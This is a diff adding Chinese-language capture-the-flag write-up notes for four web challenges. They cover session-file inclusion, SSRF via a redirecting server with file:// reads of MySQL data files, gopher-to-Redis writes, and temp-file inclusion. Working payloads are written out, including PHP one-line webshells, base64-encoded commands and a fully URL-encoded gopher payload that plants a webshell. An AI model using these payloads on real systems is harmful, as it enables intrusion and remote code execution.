@@ -1,0 +1,151 @@
+##notebook
+KEY:session文件包含，sesseion属性在脚本中可以改变
+测试了一下，有如下重点：
+1.url中action.php?module=php&file=login，当module改成其他的东西的时候，在访问会直接访问对应的文件，试了一下/etc/passwd不行
+2.有一个登录功能，可以注册，登录进去没有什么东西
+3.robots.txt中有一个phpinfo的文件/php1nFo.php
+
+访问phpinfo，发现opendir是/var/www/html/和/tmp/ ,然后感觉无解了。除非session是在tmp目录里面，然后跑去看session.save_path是在/var/lib/php5/。。。然后真的没法了吗？？session的保存目录是可以在php脚本中临时更改的，包括其他的属性都可以，所以在脚本中的save_path可能不一样。然后想到1功能，在url中访问phpinfo文件，http://cd6c523aa3434ae1b594360c1eca011f843ec99860394eac.ctf.game/action.php?module=&file=php1nFo.php 
+发现session.save_path果然变了，/tmp/SESS，在opendir中可以访问.接下来就是查看session里面存了哪些信息，cd6c523aa3434ae1b594360c1eca011f843ec99860394eac.ctf.game//action.php?module=txt&file=../../../tmp/SESS/sess_mlqpob3rktmc9s8kjsv91p9h92。 session文件是sess_PHPSESSIONID这样的格式的，sessionid在cookie中找到。发现其中包含了username这一个可控的属性，然后注册一个一句话为用户名的用户，得到session访问getshell(这里有一个waf，比较简单的一句话会被过滤掉，在这里使用 <?php $_GET[a](base64_decode($_GET[b]));?>)
+访问
+cd6c523aa3434ae1b594360c1eca011f843ec99860394eac.ctf.game//action.php?module=txt&file=../../../tmp/SESS/sess_mlqpob3rktmc9s8kjsv91p9h92&a=system&b=dGFjIGZsYWcucGhw得到flag(注意这个地方的相对路径，没想明白为啥绝对路径不行。。应该是include的实现啊，涨个姿势吧。。)
+
+##parameters
+KEY：fuzz, SSRF绕过后缀名检测
+题目hint需要fuzz.然后进去有一个do参数，因为login的框随便试了下没有注入。只有fuzz这个do参数了，然后搞出来main可以(fuzz太难搞了。。。我就搞不出来。。是不是应该搞个字典) 
+http://af00ef5de252e43fab1c40674cd7e19a20d49d24b63224e0f.ctf.game/index.php?do=main 进这个url，有一个框，查看下源码参数名是url，button名是go，猜测这里是一个访问url的功能，然后随手试了下百度。不行。说ext或scheme不对，多半这里是只能图片访问，找了个图片的链接，发现确实是。。所以这里多半是一个ssrf
+在vps构造一个文件夹/1.jpg/，然后index.php里面写上重定向，就可以实现ssrf，访问vps/1.jpg重定向，这里使用file协议发现可行, 先看了下/etc/passwd/没啥收获，然后直接看/var/www/html/index.php 
+<form action="" method="POST">
+                        <input type="text"  name="url" />
+                        <input type="submit" value="Go" />
+                </form>
+<?php
+if(isset($_GET['do'])){
+switch ($_GET['do'])
+{
+case 'login':
+    echo '
+                <form action="" method="POST">
+                        <input type="text"  name="username" />
+                        <input type="password" name="password"  />
+                        <input type="submit" value="Login" />
+                </form>
+';
+    if(isset($_POST['username']) and isset($_POST['password'])){
+        $con = mysql_connect('localhost','user','402309111c90');
+        mysql_query("set names utf8");
+        mysql_select_db("ctf");
+        $username = addslashes($_POST['username']);
+        $password = addslashes($_POST['password']);
+        $sql = "select 1 from admin where username='$username' and password='$password'";
+        $result = mysql_query($sql);
+        $num = mysql_num_rows($result);
+	if($num>0){
+            include "flag.php";
+            echo $flag;
+        }
+        else{
+            echo 'username or password wrong';
+        }
+    }
+    mysql_close();
+    break;
+case 'main':
+    echo '
+                <form action="" method="POST">
+                        <input type="text"  name="url" />
+                        <input type="submit" value="Go" />
+                </form>
+';
+    if(isset($_POST['url'])){
+    $url = $_POST['url'];
+    $ext = end(explode('.', parse_url($url)['path']));
+        if(($ext==='jpg' or $ext==='gif' or $ext==='png') and strpos($url,'http://') === 0){
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch,  CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            $output = curl_exec($ch);
+            $lo = curl_getinfo($ch,CURLINFO_EFFECTIVE_URL);
+            curl_close($ch);
+            if(stripos($lo,'flag')!==false){echo 'flag.php???';exit();}
+            if($lo!=$url){
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $lo);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch,  CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            $output = curl_exec($ch);
+            curl_close($ch);
+            }
+            print_r($output);
+        }
+        else{
+            echo 'ext or scheme wrong';
+        }
+    }
+    break;
+default:
+    echo "do wrong";
+}
+}
+else{
+    header("Location: ./index.php?do=login");
+}
+?>
+
+
+登录框有addslashes，然后是utf-8编码，也不能宽字节注入，所以只能想办法找到账号密码。。
+访问mysql的数据文件
+/var/lib/mysql/ctf/admin.frm先看admin表的结构(在index.php中可以找到admin)
+找到了InnoDB, 说明数据在ibdata1里面
+(这里对mysql的数据文件做个小总结，mysql存储引擎一般分为InnoDB和MyISAM两种，对于前者数据表的存储位置一般是.ibd文件和ibdata1文件中，对于后者一般数据表一般存储在.myi和.myd文件中, 具体的位置，ibdata1在/data/文件夹（/var/lib/mysql/）,表名.myi,表名.myd在以表名命名的文件夹(/data/表名/),frm是表的结构文件，两种储存引擎都有，在表名文件夹中，表名.frm)
+然后利用重定向访问ibdata1,找到其中的账号密码就行。注意ibdata1中的数据是按create table的顺序直接连接在一起的，类似usernamepassword这样，所以username和password具体是什么只有枚举一下了。
+
+
+##cat
+key: ssrf扫描内网，gopher协议攻击redis
+打开网站有一个url获得图片，然后base64 uri格式显示，在vps上创建1.jpg目录然后写一个index.php来重定向访问内网。(docker内网之类的)访问得到redis端口127.0.0.1:6379打开的
+hctf2016里面也有这个漏洞，用的是python的http头注入。
+这里用gopher协议
+gopher://127.0.0.1:6379/_xxxx请求1xxxx\nxx请求2xx
+对应的请求就是
+xxxx请求1xxxx
+xx请求2xx
+
+redis请求是
+config set dbfilename '1.php'
+config set dir /var/www/html/
+set key '<?php $_GET[a]($_GET[b]);?>'
+save
+exit
+url转码后放在vps的重定向里
+Location:gopher://127.0.0.1:6379/___%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%68%61%6f%7a%69%31%2e%70%68%70%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%0d%0a%73%65%74%20%36%36%36%20%22%3c%3f%70%68%70%20%24%5f%47%45%54%5b%61%5d%28%24%5f%47%45%54%5b%62%5d%29%3b%3f%3e%22%0d%0a%73%61%76%65%0d%0a%65%78%69%74%0d%0a
+
+
+##blog
+ KEY: php递归自身延迟临时文件寿命，包含临时文件getshell
+一开始的登录页面存在二次注入，在user.php的用户名处
+select * from message where user='username'
+username = xxx' and '1'='0
+在post.php页面存在insert的注入
+insert into values(xxxxxxxxx,'$_POST['title']','$_POST['content']',token?)
+两个地方照理说都能注入，但是都不能访问information数据库- -。。感觉是题目问题。
+后来直接猜有users表其中有username和password字段。。
+直接盲注select password from users where username='admin'
+注入出password = melody123
+登录进去发现有一个manage页面。其中存在lfi
+/blog_manage/manager.php?module=article_manage&name=php
+可以包含父目录。。这里可以通过包含自身延迟上传的临时文件的寿命，然后包含getshell。（在本机上实验的时候临时文件在php包含自身崩溃后会自动删除，但是题目没有删除。这里我写更通用的自己实验的方法。在删除临时文件之前包含getshell即可）这道题降低难度保留了kindeditor的目录遍历漏洞，所以可以上传后遍历临时文件目录直接获得临时文件名（没有的话只有爆破文件名，文件名具有规律，linux phpYQO3Et, windows phpxxx.tmp），而且临时文件不会删除，所以可以直接getshell。（不然需要用脚本时间竞争）
+遍历：
+http://b251ea87b5a748d0be4cd253a1a175549893df265606434d.ctf.game/kindeditor/php/file_manager_json.php?path=../../../../../tmp/ 
+getshell:
+http://b251ea87b5a748d0be4cd253a1a175549893df265606434d.ctf.game/blog_manage/manager.php?module=../../../../../tmp/phpYQO3Et&name=&a=highlight_file&b=Li4vZmxhZy5waHA= 
+附上脚本备忘：
+
+blog.py
+blog2.py
+
+
+
